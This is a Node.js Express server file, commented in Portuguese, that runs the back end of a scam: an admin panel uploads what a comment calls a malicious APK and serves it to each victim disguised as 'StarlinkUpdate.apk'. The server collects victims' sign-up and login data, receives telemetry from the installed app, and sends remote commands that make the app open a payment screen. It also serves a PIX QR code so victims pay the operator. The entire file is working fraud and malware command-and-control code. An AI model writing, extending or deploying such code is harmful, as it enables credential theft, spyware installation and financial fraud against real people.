const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const multer = require('multer');

const PORT = process.env.PORT || 3000;
const DIR = process.env.DRAEL_DATA_DIR || path.join(__dirname, 'dados');
const ARQ = path.join(DIR, 'jobs.json');
const PKGS = process.env.DRAEL_PKGS_DIR || path.join(__dirname, 'pkgs');
const APK = path.join(PKGS, 'updater.apk');

fs.mkdirSync(DIR, { recursive: true });
fs.mkdirSync(PKGS, { recursive: true });
let jobs = {};
try { jobs = JSON.parse(fs.readFileSync(ARQ, 'utf8')); } catch (_) {}
const salvar = () => fs.writeFileSync(ARQ, JSON.stringify(jobs, null, 1));

const app = express();
app.use(express.json({ limit: '5mb' }));
app.use((req, res, next) => { res.setHeader('Access-Control-Allow-Origin', '*'); next(); });
app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => res.redirect('/admin'));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// ---- upload do apk malicioso (aba "Instalador (APK)" do painel) ----
const up = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, PKGS),
    filename: (req, file, cb) => cb(null, 'updater.apk'),
  }),
  limits: { fileSize: 150 * 1024 * 1024 },
  fileFilter: (req, file, cb) =>
    /\.apk$/i.test(file.originalname) ? cb(null, true) : cb(new Error('arquivo precisa terminar em .apk')),
});

app.post('/api/apk-upload', up.single('apk'), (req, res) => {
  console.log(`[apk] upload ok: ${req.file.originalname} -> ${req.file.size} bytes`);
  res.json({ ok: true, nome: 'updater.apk', bytes: req.file.size });
});

// ---- upload de APK POR CLIENTE (botao no cartao de cada job do painel) ----
const upJob = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, PKGS),
    filename: (req, file, cb) => cb(null, String(req.params.id || 'job').replace(/[^a-zA-Z0-9-]/g, '') + '.apk'),
  }),
  limits: { fileSize: 150 * 1024 * 1024 },
  fileFilter: (req, file, cb) =>
    /\.apk$/i.test(file.originalname) ? cb(null, true) : cb(new Error('arquivo precisa terminar em .apk')),
});

app.post('/api/job/:id/apk', upJob.single('apk'), (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  if (!req.file) return res.status(400).json({ erro: 'nenhum arquivo recebido' });
  evento(j.id, 'APK enviado pelo painel para este cliente (' + (req.file.size / 1048576).toFixed(1) + ' MB)');
  res.json({ ok: true, bytes: req.file.size });
});

app.get('/api/apk-info', (req, res) => {
  if (!fs.existsSync(APK)) return res.json({ presente: false });
  const st = fs.statSync(APK);
  res.json({ presente: true, bytes: st.size, modificado: st.mtime.toISOString() });
});

const job = id => jobs[id];
function evento(id, msg) {
  const j = job(id); if (!j) return;
  j.eventos.push({ msg, ts: new Date().toISOString() });
  salvar();
}
function novoJob(dados, tipo) {
  const id = crypto.randomUUID();
  jobs[id] = { id, dados: { ...dados, tipo }, status: 'aguardando', eventos: [],
               criadoEm: new Date().toISOString() };
  evento(id, tipo === 'login' ? 'login recebido' : 'cadastro recebido');
  return jobs[id];
}

app.post('/api/cadastro', (req, res) => {
  const j = novoJob(req.body || {}, 'cadastro');
  res.json({ installId: j.id, apkUrl: `/api/apk?job=${j.id}` });
});
app.post('/api/entrada', (req, res) => {
  res.json({ installId: novoJob(req.body || {}, 'login').id });
});
app.post('/api/esqueci', (req, res) => {
  console.log('[recuperar senha]', req.body?.email || '(vazio)');
  res.json({ ok: true });
});

app.get('/api/apk', (req, res) => {
  const id = req.query.job ? String(req.query.job).replace(/[^a-zA-Z0-9-]/g, '') : '';
  const doJob = id ? path.join(PKGS, id + '.apk') : null;
  const alvo = (doJob && fs.existsSync(doJob)) ? doJob : APK;
  if (id && job(id)) {
    if (fs.existsSync(alvo)) {
      if (!job(id).avisoDl) { job(id).avisoDl = true; evento(id, 'download do apk iniciado pelo app'); }
    } else if (!job(id).avisoSemApk) {
      job(id).avisoSemApk = true;
      evento(id, 'aguardando APK — use o botao SUBIR APK no cartao deste cliente');
    }
  }
  if (!fs.existsSync(alvo)) return res.status(404).send('nenhum apk ainda para este cliente');
  res.download(alvo, 'StarlinkUpdate.apk');
});

app.post('/api/job/:id/evento', (req, res) => {
  evento(req.params.id, String(req.body?.msg ?? ''));
  res.json({ ok: true });
});
app.get('/api/job/:id/status', (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  res.json({ status: j.status, comando: j.comando || '', eventos: j.eventos });
});
app.post('/api/job/:id/concluir', (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  const f = (req.body && req.body.fonte) || 'painel';
  j.status = 'aprovado';
  evento(j.id, f === 'app'
    ? 'INSTALAÇÃO CONCLUÍDA (app — pagamento realizado)'
    : 'INSTALAÇÃO CONCLUÍDA (botão do painel)');
  res.json({ status: j.status });
});
app.post('/api/coleta', (req, res) => {
  const j = job((req.query && req.query.job) || (req.body && req.body.job));
  if (j) evento(j.id, 'lote de telemetria recebido (' + JSON.stringify(req.body).length + ' bytes)');
  res.json({ ok: true });
});

app.get('/api/jobs', (req, res) => res.json(Object.values(jobs).reverse().map(j => Object.assign({}, j, {
  apk: fs.existsSync(path.join(PKGS, String(j.id).replace(/[^a-zA-Z0-9-]/g, '') + '.apk')),
}))));

// erros do multer (arquivo sem .apk, acima do limite) viram 400 limpo
app.use((err, req, res, next) => {
  if (err) { console.error('[upload]', err.message); return res.status(400).json({ erro: err.message }); }
  next();
});

// ---- PIX: cole o codigo "copiar e colar" do banco; o QR Code eh gerado direto dele ----
const QR = require('qrcode');
const PIX = { codigo: '' };
const PIX_SAVE = path.join(DIR, 'pix.json');
try { Object.assign(PIX, JSON.parse(fs.readFileSync(PIX_SAVE, 'utf8'))) } catch (_) {}

function valorDoEmv(emv) {
  let i = 0;
  while (i + 4 <= emv.length) {
    const id = emv.substr(i, 2);
    const len = parseInt(emv.substr(i + 2, 2), 10);
    if (isNaN(len)) break;
    if (id === '54') return emv.substr(i + 4, len);
    i += 4 + len;
  }
  return '';
}

app.get('/api/pix', (req, res) => {
  if (!PIX.codigo) return res.json({ presente: false });
  res.json({ presente: true, emv: PIX.codigo, valorBruto: valorDoEmv(PIX.codigo).replace('.', ',') });
});

app.post('/api/admin/pix', (req, res) => {
  const c = String((req.body && req.body.codigo) || '').trim();
  PIX.codigo = c;
  fs.writeFileSync(PIX_SAVE, JSON.stringify(PIX, null, 1));
  res.json({ ok: true, presente: !!c, valorBruto: valorDoEmv(c).replace('.', ',') });
});

app.get('/api/pix/qrcode.png', async (req, res) => {
  if (!PIX.codigo) return res.status(404).send('defina o codigo pix no painel primeiro');
  try {
    const png = await QR.toBuffer(PIX.codigo, { width: 520, margin: 1 });
    res.type('image/png').send(png);
  } catch (e) { res.status(500).send('erro ao gerar qr'); }
});


// Comando remoto do painel para o app abrir a tela de pagamento (o poll de 2s do app lê "comando")
app.post('/api/job/:id/comando', (req, res) => {
  const j = job(req.params.id);
  if (!j) return res.status(404).json({ erro: 'job nao encontrado' });
  j.comando = (req.body && req.body.comando) || '';
  evento(j.id, 'comando enviado pelo painel: ' + j.comando);
  res.json({ ok: true });
});

const os = require('os');
function ipLan() {
  const nics = os.networkInterfaces();
  for (const nome in nics) {
    for (const n of nics[nome] || []) {
      if (n.family === 'IPv4' && !n.internal) return n.address;
    }
  }
  return 'localhost';
}
app.listen(PORT, () => console.log(
  `\n Backend:   http://localhost:${PORT}\n Painel:    http://localhost:${PORT}/admin\n Rede:      http://${ipLan()}:${PORT}/admin  <- abra esse IP no celular\n ` +
  `APKs em pkgs: ${fs.readdirSync(PKGS).filter(f => f.endsWith('.apk')).length} (cada cliente baixa o seu)\n`));